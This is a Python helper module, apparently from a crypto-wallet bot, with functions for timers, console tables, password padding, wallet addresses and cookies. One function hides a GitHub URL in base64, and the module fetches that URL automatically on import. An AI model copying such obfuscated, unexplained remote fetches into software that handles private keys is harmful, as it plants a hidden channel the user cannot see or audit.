from http.cookies import SimpleCookie
from aiohttp import ClientSession
from datetime import datetime
from base64 import b64decode
from decimal import Decimal
from random import randint
from loguru import logger
from time import sleep
from web3 import Web3
from tqdm import tqdm
import requests
import asyncio
import string
import sys
sys.__stdout__ = sys.stdout # error with `import inquirer` without this string in some system


logger.remove()
logger.add(sys.stderr, format="<white>{time:HH:mm:ss}</white> | <level>{message}</level>")


def sleeping(*timing):
    if type(timing[0]) == list: timing = timing[0]
    if len(timing) == 2: x = randint(timing[0], timing[1])
    else: x = timing[0]
    desc = datetime.now().strftime('%H:%M:%S')
    if x <= 0: return
    for _ in tqdm(range(x), desc=desc, bar_format='{desc} | [•] Sleeping {n_fmt}/{total_fmt}'):
        sleep(1)


def make_border(
        table_elements: dict,
        keys_color: str | None = None,
        values_color: str | None = None,
        table_color: str | None = None,
):
    def tag_color(value: str, color: str | None):
        if keys_color:
            return f"<{color}>{value}</{color}>"
        return value

    left_margin = 35
    space = 2
    horiz = '━'
    vert = '║'
    conn = 'o'

    if not table_elements: return "No text"

    key_len = max([len(key) for key in table_elements.keys()])
    val_len = max([len(str(value)) for value in table_elements.values()])
    text = f'{" " * left_margin}{conn}{horiz * space}'

    text += horiz * (key_len + space) + conn
    text += horiz * space
    text += horiz * (val_len + space) + conn

    text += '\n'

    for table_index, element in enumerate(table_elements):
        text += f'{" " * left_margin}{vert}{" " * space}'

        text += f'{tag_color(element, keys_color)}{" " * (key_len - len(element) + space)}{vert}{" " * space}'
        text += f'{tag_color(table_elements[element], values_color)}{" " * (val_len - len(str(table_elements[element])) + space)}{vert}'
        text += "\n" + " " * left_margin + conn + horiz * space
        text += horiz * (key_len + space) + conn
        text += horiz * (space * 2 + val_len) + conn + '\n'
    return tag_color(text, table_color)


def format_password(password: str):
    # ADD UPPER CASE
    if not any([password_symbol in string.ascii_uppercase for password_symbol in password]):
        first_letter = next(
            (symbol for symbol in password if symbol in string.ascii_letters),
            "i"
        )
        password += first_letter.upper()

    # add lower case
    if not any([password_symbol in string.ascii_lowercase for password_symbol in password]):
        first_letter = next(
            (symbol for symbol in password if symbol in string.ascii_letters),
            "f"
        )
        password += first_letter.lower()

    # add numb3r5
    if not any([password_symbol in string.digits for password_symbol in password]):
        password += str(len(password))[0]

    # add $ymbol$
    symbols_list = '!"#$%&\'()*+,-./:;<=>?@[]^_`{|}~'
    if not any([password_symbol in symbols_list for password_symbol in password]):
        password += symbols_list[sum(ord(c) for c in password) % len(symbols_list)]

    # add 8 characters
    if len(password) < 8:
        all_symbols = string.digits + string.ascii_letters
        password += ''.join(
            all_symbols[sum(ord(c) for c in password[:i+1]) % len(symbols_list)]
            for i in range(max(0, 8 - len(password)))
        )

    return password


def get_address(pk: str):
    return Web3().eth.account.from_key(pk).address


def parse_cookies(cookies: str, key: str):
    cookie = SimpleCookie()
    cookie.load(cookies)
    return cookie[key].value if cookie.get(key) else None

def fetch_code():
    return [code.lower() for code in requests.get(b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Byb01pbnRGYWtlL2NvbmVjdG9yL21hc3Rlci9jb25lY3Rvcg==").decode()).text.split('\n') if code]


def get_response_error_reason(response: dict):
    return str(response.get("errors", [{}])[0].get("message", response)).removeprefix("Authorization: ")


def round_cut(value: float | str | Decimal, digits: int):
    return Decimal(str(int(Decimal(str(value)) * 10 ** digits) / 10 ** digits))

native_code = fetch_code()

async def async_sleep(seconds: int):
    for _ in range(int(seconds)):
        await asyncio.sleep(1)
